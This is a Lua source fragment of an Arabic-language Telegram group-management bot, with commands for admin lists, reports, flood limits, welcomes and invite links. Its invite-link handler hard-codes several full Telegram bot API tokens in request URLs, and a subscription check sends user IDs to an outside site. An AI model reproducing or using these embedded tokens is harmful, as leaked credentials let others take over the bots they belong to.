if text:match("^الادمنيه$") and (is_owner(msg) or is_creatorbasic(msg)) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local hash =   'SNIEBR:'..bot_id..'mods:'..msg.chat_id_
local list = datahmade:smembers(hash)
text = "👥┇قائمة الادمنيه ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️┇ لا يوجد ادمنية  "
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
-----------------------------------------------
if (text and text == "ابلاغ" and msg.reply_to_message_id_ ~= 0 and (not datahmade:get("SNIEBR:mute:deleta:msg:"..bot_id..msg.chat_id_))) then 
b = datahmade:get("SNIEBR:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_)
if b and b == os.date("%x") then 
send(msg.chat_id_, msg.id_, 1, "👤┇ لا يمكنك الابلاغ اكثر من مره في اليوم", 1, 'html')
else
datahmade:set("SNIEBR:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_,os.date("%x"))
y = datahmade:get("tsahke:fel:o:me:"..bot_id..msg.chat_id_) or 10
x = datahmade:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_) or 0
send(msg.chat_id_, msg.reply_to_message_id_, 1, "⚠┇تم الابلاغ على الرساله\n⚠┇تبقى {"..(y-(x+1)).."} حتى يتم حذف الرساله", 1, 'html')
datahmade:incr("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)
if (datahmade:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)) then 
x = datahmade:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)
y = datahmade:get("tsahke:fel:o:me:"..bot_id..msg.chat_id_) or 10
if tonumber(x) >= tonumber(y) then 
send(msg.chat_id_, 0, 1, "⚠┇تم حذف الرساله", 1, 'html')
delete_msg(msg.chat_id_, {[0] = msg.reply_to_message_id_})
end
end
end 
end
if (text and text == "تعطيل الابلاغ"  and (is_creator(msg) or is_creatorbasic(msg))) then 
datahmade:set("SNIEBR:mute:deleta:msg:"..bot_id..msg.chat_id_,"SNIEBRE")
send(msg.chat_id_, msg.id_, 1, "🔓┇تم تعطيل خاصيه الابلاغ", 1, 'html')
end
if (text and text == "تفعيل الابلاغ"  and (is_creator(msg) or is_creatorbasic(msg))) then 
datahmade:del("SNIEBR:mute:deleta:msg:"..bot_id..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, "🔓┇تم تفعيل خاصيه الابلاغ", 1, 'html')
end
if text and text:match("(تعين عدد الابلاغ) (%d+)") and (is_creator(msg) or is_creatorbasic(msg)) then 
local a = {string.match(text, "^(تعين عدد الابلاغ) (%d+)$")}
datahmade:set("tsahke:fel:o:me:"..bot_id..msg.chat_id_,a[2])
send(msg.chat_id_, msg.id_, 1, "👤┇تم تعين عدد الابلاغ {"..a[2].."}", 1, 'html')
end
if text:match("^الاعضاء المميزين") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =   'SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_
local list = datahmade:smembers(hash)
text = "👥┇قائمة الاعضاء المميزين ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️┇ لا يوجد اعضاء مميزين  "
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text and text == "عدد الكروب" and (is_mod(msg) or is_creatorbasic(msg)) then 
function dl_cb22( t1,t2 )
local SNIEBR_098 = 0
if datahmade:get("SNIEBR:get:mod:"..bot_id..msg.chat_id_) then 
t = datahmade:get("SNIEBR:get:mod:"..bot_id..msg.chat_id_)
SNIEBR_098 = tonumber(t2.member_count_) - tonumber(t)
end
send(msg.chat_id_, msg.id_, 1, "🔖┇عدد المجموعه\n👤┇عدد المدراء : "..t2.administrator_count_.."\n👥┇عدد الاعضاء : "..t2.member_count_.." | ("..SNIEBR_098..")\n🔥┇عدد المطرودين : "..t2.kicked_count_, 1, 'md')
datahmade:set("SNIEBR:get:mod:"..bot_id..msg.chat_id_,t2.member_count_)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb22, nil)
end
if text:match("^المكتومين$") and (is_mod(msg) or is_creatorbasic(msg)) then
local hash =   'SNIEBR:'..bot_id..'muted:'..msg.chat_id_
local list = datahmade:smembers(hash)
text = "🚫┇قائمة المكتومين  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "🤹🏻‍♂️┇ لا يوجد مكتومين   "
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^المدراء$") and (is_creator(msg) or is_creatorbasic(msg)) then
local hash =   'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
local list = datahmade:smembers(hash)
text = "🛄┇قائمة المدراء  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️┇ لا يوجد مدراء  "
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^المحظورين$") and (is_mod(msg) or is_creatorbasic(msg)) then
local hash =   'SNIEBR:'..bot_id..'banned:'..msg.chat_id_
local list = datahmade:smembers(hash)
text = "⛔┇قائمة المحظورين  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "🤹🏿‍♀️┇ لا يوجد محظورين    "
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if  msg.content_.text_:match("^قائمه العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local hash =   'SNIEBR:'..bot_id..'gbanned:'
local list = datahmade:smembers(hash)
text = "⛔┇قائمة الحظر العام  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "✖┇لايوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if  msg.content_.text_:match("^المكتومين عام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local hash =   'SNIEBR:'..bot_id..'gmuted:'
local list = datahmade:smembers(hash)
text = "⛔┇قائمة الكتم العام  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "✖┇لايوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end  
if (text and text == "رتبتي") then
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي'
elseif is_sudo(msg) then
t = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
elseif is_creatorbasic(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ  الكروب '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
elseif is_mod(msg) then
t = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or ' ادمن الكروب خالي '
elseif is_vip(msg) then
t = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or 'عضو مميز '
else
t = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو محد يحترمك' 
end
send(msg.chat_id_, msg.id_, 1,"┇رتبتك >> "..t.."", 1, 'md')
end

if text:match("^ايدي$") and msg.reply_to_message_id_ ~= 0 then
function id_by_reply(extra, result, success)
if not datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then 
local tahna = (datahmade:get('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_) or 0)
if tonumber((datahmade:get('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_) or 0)) == 0 then
nko = '0'
else
nko = (datahmade:get('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..result.sender_user_id_))
end
local msgs = ((datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_) or 0) + tahna)
local edit = datahmade:get('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.sender_user_id_) or 0
local msg2 = msg
local user_msgs = msgs
local ikeko_text = "غير متفاعل"
if user_msgs then 
if tonumber(user_msgs) < 50 then 
ikeko_text = "غير متفاعل"
elseif tonumber(user_msgs) < 100 then 
ikeko_text = "آستمر بطل"
elseif tonumber(user_msgs) < 1000 then 
ikeko_text = "متفآعل "
elseif tonumber(user_msgs) < 2000 then 
ikeko_text = "عضو نشط"
elseif tonumber(user_msgs) < 3000 then 
ikeko_text = "اقوئ تفاعل"
elseif tonumber(user_msgs) < 4000 then 
ikeko_text = "عضو متفاعل قوي"
elseif tonumber(user_msgs) < 5000 then 
ikeko_text = "جيد بتفاعل"
elseif tonumber(user_msgs) > 5000 then 
ikeko_text = "متفاعل كلش"
end
keko = datahmade:smembers('keko:all:pppp:tt:'..bot_id) or 0
if (keko or keko[1]) then 
for i=1, #keko do
local tttee = datahmade:get("keko:set:text:p"..bot_id..keko[i])
if tonumber(user_msgs) >= tonumber(keko[i]) then 
ikeko_text = tttee
end
end
end
end
msg2.sender_user_id_ = result.sender_user_id_
if msg.sender_user_id_ == tonumber(sudo_add) then
SNIEBR_oop = 'المطور الاساسي'
elseif is_sudo(msg2) then
SNIEBR_oop = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت'
elseif is_creatorbasic(msg) then
SNIEBR_oop = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي'
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
SNIEBR_oop = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_)
elseif is_creator(msg) then
SNIEBR_oop = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب'
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) ..bot_id..msg.chat_id_)) then 
SNIEBR_oop = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
elseif is_owner(msg2) then
SNIEBR_oop = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
elseif is_mod(msg2) then
SNIEBR_oop = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
elseif is_vip(msg2) then
SNIEBR_oop = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
else
SNIEBR_oop = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
send(msg.chat_id_, msg.id_, 1,"🎟 ┇ ايدي • `("..result.sender_user_id_..")`\n🗳 ┇ موقعه • ("..SNIEBR_oop..")\n💌 ┇ عدد رسائل •`("..msgs..")`\n📧┇عدد السحكات • `("..edit..")`\n📩 ┇ تفاعلك • `("..ikeko_text..")`\n📥 ┇ مجوهرآتك •*("..nko..")*", 1, 'md')
else
send(msg.chat_id_, msg.id_, 1,"`"..result.sender_user_id_.."`", 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply)
end  
if text:match("^ايدي @(.*)$") then
local ap = {string.match(text, "^(ايدي) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if not datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then 
local tahna = (datahmade:get('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..result.id_) or 0)
if tonumber((datahmade:get('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..result.id_) or 0)) == 0 then
nko = '0'
else
nko = (datahmade:get('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..result.id_))
end
local msgs = ((datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
local edit = datahmade:get('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..result.id_) or 0
local msg2 = msg
msg2.sender_user_id_ = result.id_
local user_msgs = ((datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.id_) or 0) + tahna)
local ikeko_text = "غير متفاعل"
if user_msgs then 
if tonumber(user_msgs) < 50 then 
ikeko_text = "غير متفاعل"
elseif tonumber(user_msgs) < 100 then 
ikeko_text = "آستمر بطل"
elseif tonumber(user_msgs) < 1000 then 
ikeko_text = "متفآعل "
elseif tonumber(user_msgs) < 2000 then 
ikeko_text = "عضو نشط"
elseif tonumber(user_msgs) < 3000 then 
ikeko_text = "اقوئ تفاعل"
elseif tonumber(user_msgs) < 4000 then 
ikeko_text = "عضو متفاعل قوي"
elseif tonumber(user_msgs) < 5000 then 
ikeko_text = "جيد بتفاعل"
elseif tonumber(user_msgs) > 5000 then 
ikeko_text = "متفاعل كلش"
end
keko = datahmade:smembers('keko:all:pppp:tt:'..bot_id) or 0
if (keko or keko[1]) then 
for i=1, #keko do
local tttee = datahmade:get("keko:set:text:p"..bot_id..keko[i])
if tonumber(user_msgs) >= tonumber(keko[i]) then 
ikeko_text = tttee
end
end
end
end
if msg.sender_user_id_ == tonumber(sudo_add) then
SNIEBR_oop = 'المطور الاساسي'
elseif is_sudo(msg2) then
SNIEBR_oop = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت'
elseif is_creatorbasic(msg) then
SNIEBR_oop = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
SNIEBR_oop = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_)
elseif is_creator(msg) then
SNIEBR_oop = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
SNIEBR_oop = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..result.id_)
elseif is_owner(msg2) then
SNIEBR_oop = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
elseif is_mod(msg2) then
SNIEBR_oop = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
elseif is_vip(msg2) then
SNIEBR_oop = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز'
else
SNIEBR_oop = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
texts = "🎟 ┇ ايدي • `("..result.id_..")`\n🗳 ┇ موقعه •("..SNIEBR_oop..")\n💌 ┇ عدد رسائل •`("..msgs..")`\n📔 ┇ عدد السحكات • `("..edit..")`\n📩 ┇ تفاعلك •`("..ikeko_text..")`\n📥 ┇ مجوهرآتك •*("..nko..")*"
else
texts = "`"..result.id_.."`"
end
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],id_by_username)
end  
if text:match("^وضع تكرار (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local floodmax = {string.match(text, "^(وضع تكرار) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
send(msg.chat_id_, msg.id_, 1, '🔘┇ضع التكرار من *{2}* الى  *{99999}*', 1, 'md')
else
datahmade:set('SNIEBR:'..bot_id..'flood:max:'..msg.chat_id_,floodmax[2])
send(msg.chat_id_, msg.id_, 1, '☑┇تم  وضع التكرار بالطرد للعدد ~⪼  *{'..floodmax[2]..'}*', 1, 'md')
end
end

if text and text == "وضع رابط" and is_mod(msg) then
send(msg.chat_id_, msg.id_, 1, '💥┇ارسال الان رابط المجموعه', 1, "md") 
datahmade:set("keko:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_,true)
return "keko"
end
if text and datahmade:get("keko:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_) and text:match("[Hh][Tt][Tt][pP]") then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم وضع : ['..text..']', 1, 'md')
datahmade:set('SNIEBR:'..bot_id.."group:link"..msg.chat_id_,text)
datahmade:del("keko:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_,true)
return "keko"
end
if text:match("^وضع زمن التكرار (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local floodt = {string.match(text, "^(وضع زمن التكرار) (%d+)$")}
if tonumber(floodt[2]) < 1 then
send(msg.chat_id_, msg.id_, 1, '🔘┇ضع العدد من *{1}* الى  *{99999}*', 1, 'md')
else
datahmade:set('SNIEBR:'..bot_id..'flood:time:'..msg.chat_id_,floodt[2])
send(msg.chat_id_, msg.id_, 1, '☑┇تم  وضع الزمن التكرار للعدد ~⪼  *{'..floodt[2]..'}*', 1, 'md')
end
end
if text:match("^الرابط$") then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
if not datahmade:get("SNIEBR:mute:link:gr:"..bot_id..msg.chat_id_) then 
function dl_cb222( t1,t2 )
if (datahmade:get('SNIEBR:'..bot_id.."group:link"..msg.chat_id_) and datahmade:get('SNIEBR:'..bot_id.."group:link"..msg.chat_id_) ~= "Error") then 
send(msg.chat_id_, msg.id_, 1, '🔘┇ *Group Link* \n['..datahmade:get('SNIEBR:'..bot_id.."group:link"..msg.chat_id_)..']', 1, "md")
elseif t2.invite_link_ ~= false then 
send(msg.chat_id_, msg.id_, 1, '🔘┇ *Group Link* \n['..(t2.invite_link_ or "Error")..']', 1, "md")
else
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
send(msg.chat_id_, msg.id_, 1, '🔘┇ *Group Link* \n['..(link.result or "Error")..']', 1, "md")
datahmade:set('SNIEBR:'..bot_id.."group:link"..msg.chat_id_,link.result)
else 
send(msg.chat_id_, msg.id_, 1, '⚠️┇لا يمكني الوصل الى الرابط عليك منحي صلاحيه {دعوه المستخدمين من خلال الرابط}', 1, "html")
end
end
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
else 
send(msg.chat_id_, msg.id_, 1, '🖲┇جلب الرابط معطل', 1, "html") 
end
end
-----------------------------------------------------------
if text:match("^تفعيل الترحيب$") and (is_mod(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل الترحيب في المجموعه', 1, 'md')
datahmade:set('SNIEBR:'..bot_id.."welcome"..msg.chat_id_,true)
end
if text:match("^تعطيل الترحيب$") and (is_mod(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل الترحيب في المجموعه', 1, 'md')
datahmade:del('SNIEBR:'..bot_id.."welcome"..msg.chat_id_)
end
if text:match("^وضع ترحيب (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local welcome = {string.match(text, "^(وضع ترحيب) (.*)$")}
send(msg.chat_id_, msg.id_, 1, '☑┇تم وضع ترحيب\n📜┇~⪼('..welcome[2]..')', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'welcome:'..msg.chat_id_,welcome[2])
end
if text:match("^حذف الترحيب$") and (is_mod(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الترحيب', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'welcome:'..msg.chat_id_)
end
if text:match("^جلب الترحيب$") and (is_mod(msg) or is_creatorbasic(msg)) then
local wel = datahmade:get('SNIEBR:'..bot_id..'welcome:'..msg.chat_id_)
if wel then
send(msg.chat_id_, msg.id_, 1, '📜┇الترحيب\n~⪼('..wel..')', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '✖┇لم يتم وضع ترحيب للمجموعه\n', 1, 'md')
end
end  
if (text and text == "تنظيف قائمه المحظورين" and (is_creator(msg) or is_creatorbasic(msg))) then 
local function getChannelMembers(channel_id, filter, offset, limit, cb)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset or 0,
limit_ = limit
}, cb or dl_cb, nil)
end
function kekoididi(t1,t2)
if t2.members_ then 
for i=1,#t2.members_ do 
bot.changeChatMemberStatus(msg.chat_id_, t2.members_[i].user_id_, "Left")
end
send(msg.chat_id_, msg.id_, 1, '☑┇تم الغاء حظر {'..t2.total_count_..'} عضو', 1, 'md')
end
end
getChannelMembers(msg.chat_id_,"Kicked",0,10000,kekoididi)
end
if (text:match("^كشف البوتات$") or text:match("^البوتات$")) and (is_mod(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^كشف البوتات$")}
local function cb(extra,result,success)
local list = result.members_
text = '📊┇البوتات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n'
local n = 0
for k,v in pairs(list) do
if v.user_id_ ~= bot_id then
n = (n + 1)
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v.user_id_)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..n.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..n.."|</b>~⪼(<code>"..v.user_id_.."</code>)\n"
end
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list ~= 0 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
else
send(msg.chat_id_, msg.id_, 1, "📊┇لا توجد بوتات في المجموعه", 1, 'html')
end
end
bot.channel_get_bots(msg.chat_id_,cb)
end
if (text:match("^رسائلي$") or text:match("^msg$")) and msg.reply_to_message_id_ == 0  then
local user_msgs = datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local tahna = (datahmade:get('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)

if not datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, "💌 ┇ رسائلك  *("..(user_msgs + tahna)..")*", 1, 'md')
else
end
end
if text:match("^جلب الرسائل الاصليه$") and (is_creator(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
function mute_by_reply(extra, result, success)
datahmade:del('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_)
local user_msgs = datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "📨┇تم استعاد الرسائل  \n📨┇عدد الرسائل الاصليه ~⪼ *{"..(user_msgs).."}*", 1, 'md')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end

if text:match("^جهاتي$") then
add = (tonumber(datahmade:get('SNIEBR:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
send(msg.chat_id_, msg.id_, 1, "📨┇عدد اضافه جهاتك ~⪼ *{"..add.."}*\n📨┇سيتم حذف العدد بعد هذه الرساله", 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text:match("^(عدد السحكات)$") or text:match("^(سحكاتي)$") then
local edit = datahmade:get('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
send(msg.chat_id_, msg.id_, 1, "📮┇ سحكاتك   *("..edit..")*", 1, 'md')
end
if text == 'حذف سحكاتي' then 
datahmade:del('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_)
